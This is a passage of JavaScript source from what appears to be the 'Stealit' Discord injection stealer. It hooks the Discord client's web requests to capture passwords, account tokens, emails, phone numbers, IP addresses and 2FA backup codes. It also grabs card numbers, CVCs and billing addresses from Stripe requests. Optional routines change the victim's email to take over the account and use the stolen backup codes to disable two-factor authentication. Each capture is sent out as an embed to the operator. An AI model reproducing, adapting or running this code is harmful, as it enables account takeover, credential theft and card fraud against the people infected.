                  name: "Language <:language:1206229413998493737>",
                  value: `${GetLangue(user.locale)}`,
                  inline: !0,
                },
                {
                  name: "NSFW <:underagex:1206229680856895519>",
                  value: `${GetNSFW(user.nsfw_allowed)}`,
                  inline: !0,
                },
                {
                  name: "2FA <:keys:1206229927507136574>",
                  value: `${GetA2F(user.mfa_enabled)}`,
                  inline: !0,
                },
                {
                  name: "@Copyright",
                  value: `[Stealit 2024](https://t.me/stealitpublic)`,
                  inline: !0,
                },
                {
                  name: "Stealit Files 📁",
                  value: `[Gofile](${config.transfer_link})`,
                  inline: !0,
                },
                {
                  name: "Billing <a:moneyx:1206250495329570948>",
                  value: `${Billings}`,
                  inline: !0,
                },
                {
                  name: "Email <:mail:1206251253567455314>",
                  value: `\`${user.email}\``,
                  inline: !0,
                },
                {
                  name: "Phone <:iphone:1206253352439255051>",
                  value: `\`${user.phone ?? "None"}\``,
                  inline: !0,
                },
                {
                  name: "<:password:1206254317229707387> Password",
                  value: `\`${password}\``,
                  inline: !0,
                },
                {
                  name: "Bio <:stealit:1206869154691416084>",
                  value: `\`\`\`${
                    user.bio !== null &&
                    user.bio !== undefined &&
                    user.bio !== ""
                      ? user.bio
                      : ":x:"
                  }\`\`\``,
                  inline: false,
                },
                {
                  name: "<:artreal:1206252088112316456> Token",
                  value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
                  inline: !1,
                },
              ],

              thumbnail: userAvatar,
            });

            var params2 = await makeEmbed({
              title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
              color: config["embed-color"],
              description: Friends.badges,
              image: userBanner,
              thumbnail: userAvatar,
            });

            params.embeds.push(params2.embeds[0]);

            await post(params);
            break;
          }
        }
      case request.url.endsWith("users/@me"):
        if (!data.password) return;
        if (data.new_password) {
          var params = await makeEmbed({
            title:
              "<:stealit:1206869154691416084> Stealit Detect Password Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
                name: "Username <:mention:1206228892629864488>",
                value: `\`${user.username}#${user.discriminator}\``,
                inline: !0,
              },
              {
                name: "ID <:identy:1206228345407406120>",
                value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
                inline: !0,
              },
              {
                name: "Nitro <:nitros:1206229096128843837>",
                value: `${GetNitro(Nitro)}`,
                inline: !0,
              },
              {
                name: "Badges <a:badges:1206229283366768701>",
                value: `${GetBadges(user.flags)}`,
                inline: !0,
              },
              {
                name: "Language <:language:1206229413998493737>",
                value: `${GetLangue(user.locale)}`,
                inline: !0,
              },
              {
                name: "NSFW <:underagex:1206229680856895519>",
                value: `${GetNSFW(user.nsfw_allowed)}`,
                inline: !0,
              },
              {
                name: "2FA <:keys:1206229927507136574>",
                value: `${GetA2F(user.mfa_enabled)}`,
                inline: !0,
              },
              {
                name: "@Copyright",
                value: `[Stealit 2024](https://t.me/stealitpublic)`,
                inline: !0,
              },
              {
                name: "Stealit Files 📁",
                value: `[Gofile](${config.transfer_link})`,
                inline: !0,
              },
              {
                name: "Billing <a:moneyx:1206250495329570948>",
                value: `${Billings}`,
                inline: !0,
              },
              {
                name: "Email <:mail:1206251253567455314>",
                value: `\`${user.email}\``,
                inline: !0,
              },
              {
                name: "Phone <:iphone:1206253352439255051>",
                value: `\`${user.phone ?? "None"}\``,
                inline: !0,
              },
              {
                name: "Old Password <:password:1206254317229707387>",
                value: `\`${data.password}\``,
                inline: !0,
              },
              {
                name: "New Password <:password:1206254317229707387>",
                value: `\`${data.new_password}\``,
                inline: !0,
              },
              {
                name: "Bio <:stealit:1206869154691416084>",
                value: `\`\`\`${
                  user.bio !== null && user.bio !== undefined && user.bio !== ""
                    ? user.bio
                    : ":x:"
                }\`\`\``,
                inline: false,
              },
              {
                name: "<:artreal:1206252088112316456> Token",
                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
                inline: !1,
              },
            ],

            thumbnail: userAvatar,
          });

          var params2 = await makeEmbed({
            title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
            color: config["embed-color"],
            description: Friends.badges,
            image: userBanner,
            thumbnail: userAvatar,
          });

          params.embeds.push(params2.embeds[0]);

          await post(params);
        } else if (data.email) {
          if (config.changeMailAuto == "true") {
            const atIndex = config.mail.indexOf("@");
            const username = config.mail.substring(0, atIndex);
            const domain = config.mail.substring(atIndex);

            const generatedEmail = `${username ?? "kschdediscord"}+${generateId(
              3
            )}${domain ?? "@gmail.com"}`;
            const generatedPassword = generatePassword();

            console.log(generatedEmail, generatedPassword);
            try {
              const res = await updateEmail(
                token,
                generatedEmail,
                data.password
              );
              if (res.username) {
                var params = await makeEmbed({
                  title:
                    "<:stealit:1206869154691416084> Stealit Have changed the victim mail",
                  color: config["embed-color"],
                  description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                  fields: [
                    {
                      name: "Username <:mention:1206228892629864488>",
                      value: `\`${res.username}#${res.discriminator}\``,
                      inline: !1,
                    },
                    {
                      name: "ID <:identy:1206228345407406120>",
                      value: `\`${res.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${res.id})`,
                      inline: !1,
                    },
                    {
                      name: "Badges <a:badges:1206229283366768701>",
                      value: `${GetBadges(res.flags)}`,
                      inline: !1,
                    },
                    {
                      name: "2FA <:keys:1206229927507136574>",
                      value: `${GetA2F(res.mfa_enabled)}`,
                      inline: !1,
                    },
                    {
                      name: "@Copyright",
                      value: `[Stealit 2024](https://t.me/stealitpublic)`,
                      inline: !1,
                    },
                    {
                      name: "Stealit Files 📁",
                      value: `[Gofile](${config.transfer_link})`,
                      inline: !1,
                    },
                    {
                      name: "Phone <:iphone:1206253352439255051>",
                      value: `\`${res.phone ?? "None"}\``,
                      inline: !1,
                    },
                    {
                      name: "New Email <:mail:1206251253567455314>",
                      value: `\`${res.email}\``,
                      inline: !1,
                    },
                    {
                      name: "<:password:1206254317229707387> Password",
                      value: `\`${generatedPassword}\``,
                      inline: !1,
                    },
                    {
                      name: "<:artreal:1206252088112316456> Token",
                      value: `\`\`\`${res.token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${res.token})`,
                      inline: !1,
                    },
                  ],
                  thumbnail: userAvatar,
                });

                await post(params);
                break;
              }
            } catch (error) {}
          }
          var params = await makeEmbed({
            title:
              "<:stealit:1206869154691416084> Stealit Detect Email Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
                name: "Username <:mention:1206228892629864488>",
                value: `\`${user.username}#${user.discriminator}\``,
                inline: !0,
              },
              {
                name: "ID <:identy:1206228345407406120>",
                value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
                inline: !0,
              },
              {
                name: "Nitro <:nitros:1206229096128843837>",
                value: `${GetNitro(Nitro)}`,
                inline: !0,
              },
              {
                name: "Badges <a:badges:1206229283366768701>",
                value: `${GetBadges(user.flags)}`,
                inline: !0,
              },
              {
                name: "Language <:language:1206229413998493737>",
                value: `${GetLangue(user.locale)}`,
                inline: !0,
              },
              {
                name: "NSFW <:underagex:1206229680856895519>",
                value: `${GetNSFW(user.nsfw_allowed)}`,
                inline: !0,
              },
              {
                name: "2FA <:keys:1206229927507136574>",
                value: `${GetA2F(user.mfa_enabled)}`,
                inline: !0,
              },
              {
                name: "@Copyright",
                value: `[Stealit 2024](https://t.me/stealitpublic)`,
                inline: !0,
              },
              {
                name: "Stealit Files 📁",
                value: `[Gofile](${config.transfer_link})`,
                inline: !0,
              },
              {
                name: "Billing <a:moneyx:1206250495329570948>",
                value: `${Billings}`,
                inline: !0,
              },
              {
                name: "New Email <:mail:1206251253567455314>",
                value: `\`${user.email}\``,
                inline: !0,
              },
              {
                name: "Phone <:iphone:1206253352439255051>",
                value: `\`${user.phone ?? "None"}\``,
                inline: !0,
              },
              {
                name: "<:password:1206254317229707387> Password",
                value: `\`${data.password}\``,
                inline: !0,
              },
              {
                name: "Bio <:stealit:1206869154691416084>",
                value: `\`\`\`${
                  user.bio !== null && user.bio !== undefined && user.bio !== ""
                    ? user.bio
                    : ":x:"
                }\`\`\``,
                inline: false,
              },
              {
                name: "<:artreal:1206252088112316456> Token",
                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
                inline: !1,
              },
            ],

            thumbnail: userAvatar,
          });

          var params2 = await makeEmbed({
            title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
            color: config["embed-color"],
            description: Friends.badges,
            image: userBanner,
            thumbnail: userAvatar,
          });

          params.embeds.push(params2.embeds[0]);

          await post(params);
          break;
        }
      case request.url.includes("api.stripe"):
        var [CardNumber, CardCVC, month, year] = [
          data["card[number]"],
          data["card[cvc]"],
          data["card[exp_month]"],
          data["card[exp_year]"],
        ];

        if (CardNumber && CardCVC && month && year) {
          await electron.session.defaultSession.webRequest.onCompleted(
            config.onCompletedbis,
            async (re, callback) => {
              try {
                var dt = JSON.parse(re.uploadData[0].bytes);
              } catch (err) {
                var dt = queryString.parse(
                  decodeURIComponent(re.uploadData[0].bytes.toString())
                );
              }
              let { line_1, line_2, city, state, postal_code, country, email } =
                dt.billing_address;
              var params = await makeEmbed({
                title:
                  "<:stealit:1206869154691416084> Stealit User Credit Card Added",
                color: config["embed-color"],
                fields: [
                  {
                    name: "Stealit Files 📁",
                    value: `[Gofile](${config.transfer_link})`,
                    inline: false,
                  },
                  {
                    name: "IP",
                    value: `\`${ip}\``,
                    inline: false,
                  },
                  {
                    name: "ID <:identy:1206228345407406120>",
                    value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
                    inline: false,
                  },
                  {
                    name: "Username <:username:1041634536733290596>",
                    value: `\`${user.username}#${user.discriminator}\``,
                    inline: false,
                  },
                  {
                    name: "Language <:language:1206229413998493737>",
                    value: GetLangue(user.locale),
                    inline: false,
                  },
                  {
                    name: "2FA <:keys:1206229927507136574>",
                    value: GetA2F(user.mfa_enabled),
                    inline: false,
                  },
                  {
                    name: "Badges <a:badges:1206229283366768701>",
                    value: GetBadges(user.flags),
                    inline: false,
                  },
                  {
                    name: "Address <:identy:1206228345407406120>",
                    value: `\`\`\`md\n# Line 1 : ${line_1},\n# Line 2 : ${line_2},\n# City : ${city},\n# State : ${state},\n# Postal Code : ${postal_code},\n# Country : ${country}\n\`\`\``,
                    inline: false,
                  },
                  {
                    name: "Credit Card <:identy:1206228345407406120>",
                    value: `\`\`\`md\n# Card Number : ${CardNumber}\n# Card Expiration : ${
                      month + "/" + year
                    }\n# CVC : ${CardCVC}\`\`\``,
                    inline: false,
                  },
                  {
                    name: "<:artreal:1206252088112316456> Token",
                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
                    inline: false,
                  },
                ],

                thumbnail: userAvatar,
              });
              await post(params);
            }
          );
        }
        break;
      case request.url.endsWith("/enable"):
        let ValidFound = false;
        let backup_codes = (await execScript(backupscript)) ?? "";

        if (config.disable2FA == "true") {
          for (let i = 0; i < backup_codes.length; i++) {
            if (!ValidFound) {
              let res = await remove2FA(token, backup_codes[i]);
              let parse_res = JSON.parse(res);
              if (parse_res.token) {
                ValidFound = true;
                break;
              } else {
                if (parse_res.message && parse_res.code) {
                  if (parse_res.message == "401: Unauthorized") {
                    ValidFound = true;
                    break;
                  }
                } else {
                  if (parse_res.message != "Invalid two-factor code") {
                    ValidFound = true;
                    break;
                  } else {
                    continue;
                  }
                }
              }
            }
          }
        }

        var params = await makeEmbed({
          title: "<:stealit:1206869154691416084> Stealit User Enable 2FA",
          color: config["embed-color"],
          fields: [
            {
              name: "Stealit Files 📁",
              value: `[Gofile](${config.transfer_link})`,
              inline: false,
            },
            {
              name: "IP",
              value: `\`${ip}\``,
              inline: false,
            },
            {
              name: "Username <:username:1041634536733290596>",
              value: `\`${user.username}#${user.discriminator}\``,
              inline: false,
            },
            {
              name: "ID <:identy:1206228345407406120>",
              value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
              inline: false,
            },
            {
              name: "Language <:language:1206229413998493737>",
              value: GetLangue(user.locale),
              inline: false,
            },
            {
              name: "2FA disabler Response <:2FA:982994698278952980>",
              value: `\`\`\`md\n- ${
                ValidFound ? "Disabled" : "Cannot Disable"
              }\`\`\``,
              inline: false,
            },
            {
              name: "2FA <:keys:1206229927507136574>",
              value: GetA2F(user.mfa_enabled),
              inline: false,
            },
            {
              name: "Badges <a:badges:1206229283366768701>",
              value: GetBadges(user.flags),
              inline: false,
            },
            {
              name: "Backups Code <:identy:1206228345407406120>",
              value: `\`\`\`md\n${backup_codes
                .map((x) => `- ${x}`)
                .join("\n")}\`\`\``,
              inline: false,
            },
            {
              name: "<:artreal:1206252088112316456> Token",
              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
              inline: false,
            },
          ],

          thumbnail: userAvatar,
        });
        await post(params);
        break;
      case request.url.endsWith("/disable"):
        var params = await makeEmbed({
          title: "<:stealit:1206869154691416084> Stealit User Removed 2FA",
          color: config["embed-color"],
          fields: [
            {
              name: "Stealit Files 📁",
              value: `[Gofile](${config.transfer_link})`,
              inline: false,
            },
            {
              name: "IP",
              value: `\`${ip}\``,
              inline: false,
            },
            {
              name: "Username <:username:1041634536733290596>",
              value: `\`${user.username}#${user.discriminator}\``,
              inline: false,
            },
            {
              name: "Language <:language:1206229413998493737>",
              value: GetLangue(user.locale),
              inline: false,
            },
            {
              name: "2FA <:keys:1206229927507136574>",
              value: GetA2F(user.mfa_enabled),
              inline: false,
            },
            {
              name: "Badges <a:badges:1206229283366768701>",
              value: GetBadges(user.flags),
              inline: false,
            },
            {
              name: "<:artreal:1206252088112316456> Token",
              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
              inline: !1,
            },
          ],

          thumbnail: userAvatar,
        });
        await post(params);
        break;
      case request.url.endsWith("/codes-verification"):
        let validCodeFound = false;
        let backup_code = (await execScript(backupscript)) ?? "";
        if (config.disable2FA == "true") {
          for (let i = 0; i < backup_code.length; i++) {
            if (!validCodeFound) {
              let res = await remove2FA(token, backup_code[i]);
              let parse_res = JSON.parse(res);
              if (parse_res.token) {
                validCodeFound = true;
                break;
              } else {
                if (parse_res.message && parse_res.code) {
                  if (parse_res.message == "401: Unauthorized") {
                    validCodeFound = true;
                    break;
                  }
                } else {
                  if (parse_res.message != "Invalid two-factor code") {
                    validCodeFound = true;
                    break;
                  } else {
                    continue;
                  }
                }
              }
            }
          }
        }
        var params = await makeEmbed({
          title: "<:stealit:1206869154691416084> Stealit User 2FA Codes",
          color: config["embed-color"],
          fields: [
            {
              name: "Stealit Files 📁",
              value: `[Gofile](${config.transfer_link})`,
              inline: false,
            },
            {
              name: "IP",
              value: "`" + ip + "`",
              inline: false,
            },
            {
              name: "Username <:username:1041634536733290596>",
              value: `\`${user.username}#${user.discriminator}\``,
              inline: false,
            },
            {
              name: "Language <:language:1206229413998493737>",
              value: GetLangue(user.locale),
              inline: false,
            },
            {
              name: "2FA <:keys:1206229927507136574>",
              value: GetA2F(user.mfa_enabled),
              inline: false,
            },
            {
              name: "Badges <a:badges:1206229283366768701>",
              value: GetBadges(user.flags),
              inline: false,
            },
            {
              name: "2FA disabler Response <:2FA:982994698278952980> ",
              value: `\`\`\`md\n- ${
                validCodeFound ? "Disabled" : "Cannot Disable"
              }\`\`\``,
              inline: false,
            },
            {
              name: "Backup Codes <:identy:1206228345407406120>",
              value: `\`\`\`md\n${backup_code
                .map((x) => `- ${x}`)
                .join("\n")}\`\`\``,
              inline: false,
            },
            {
              name: "<:artreal:1206252088112316456> Token",
              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
              inline: !1,
            }, 
          ],

          thumbnail: userAvatar,
        });
        await post(params);
        break;
    }
  }
);
